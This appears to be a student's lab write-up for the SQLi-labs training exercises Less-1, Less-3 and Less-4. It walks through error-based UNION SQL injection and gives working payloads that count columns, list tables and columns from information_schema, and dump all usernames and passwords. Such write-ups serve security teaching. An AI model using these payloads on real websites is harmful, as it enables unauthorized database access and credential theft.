# SQLI

## LESS-1: Error based - single quote - string
*Reference wiki.bi0s.in*
		
here we are asked to input id as parameter with numeric value so when we give ?id=10 we get username and password, To break the query we try giving special characters like \,' ,so when we give \ as input we get an error  ''\' LIMIT 0,1' saying that the syntax of query is wrong 

here the part of the query which has the error is placed inside single quotes removing them we get
'\' LIMIT 0,1 so here we can clearly see that the input we give is place inside the single quotes, i.e this query is single quoted 

now we try to dump the data i.e get all usernames and passwords by giving a specified input

1.First we try to find the number of attributes in the query 
this can be done by using UNION keyword, which when used in a query should have same no of attributes 
so when we try untill we get rid of the error
?id=-1' UNION select 1,2,3-- -

so from this the statement we can conclude that we are having 3 attributes in the query and the username and password we get are the input we gave at second and third positions

so using database() we find the database(security)
now we find table name and column name 
so inside information_schema we have a relation named TABLES which contains data of all tables,so this relation contains attributes named TABLE_SCHEMA and TABLE_NAME, which has database names and names of TABLE_NAME respectively

So now to get list of all tables in database
we give 
#?id=-1' union select 1,group_concat(TABLE_NAME),3 FROM information_schema.TABLES where TABLE_SCHEMA = 'security'-- - 

Now to get the attributes in the users table we give the query

#?id=-1' union select 1,group_concat(COLUMN_NAME),3 from information_schema.COLUMNS where TABLE_NAME='users' and TABLE_SCHEMA='security'-- -

now we have the attributes id,username,password now to dump the data we give 

#?id=-1' union select 1,group_concat(username),group_concat(password) from users -- - 

which will give all the usernames and passwords

## LESS-3: Error-based-single quotes with twist
		
this is also similar to less-1,when we give an integer we get username and password,here the difference is when we try to break the query using \ or ' 
we get
'\') LIMIT 0,1 
so the we can understand that this is a single quoted query with brackets
now this is same as less-1 the only thing we change here is we add a bracket after the single quote 
so briefly the payloads used are

?id=-1') UNION select 1,2,3-- -  
to find no of columns

?id=-1') union select 1,group_concat(TABLE_NAME),3 FROM information_schema.TABLES where TABLE_SCHEMA = 'security'-- - 
to find table name(users)

?id=-1') union select 1,group_concat(COLUMN_NAME),3 from information_schema.COLUMNS where TABLE_NAME='users' and TABLE_SCHEMA='security'-- -
to get attribute names(username,id,password)

?id=-1') union select 1,group_concat(username),group_concat(password) from users -- - 
to get values

## LESS-4:Error-based-Double quotes
This is also a very similar one to less-1 and less-3 since the database and tables are the same, only difference is breaking the query
so when we give \ as input we get
 "\") LIMIT 0,1
so we can conclude that this is double quoted query with brackets
and from here this is same as above one
the payloads are
?id=-1") UNION select 1,2,3-- -
To find no of attributes

?id=-1") union select 1,group_concat(TABLE_NAME),3 FROM information_schema.TABLES where TABLE_SCHEMA = 'security'-- - 
to find table name(users)

?id=-1") union select 1,group_concat(COLUMN_NAME),3 from information_schema.COLUMNS where TABLE_NAME='users' and TABLE_SCHEMA='security'-- -
to get attribute names

?id=-1") union select 1,group_concat(username),group_concat(password) from users -- - 
to get attribute names(username,id,password)



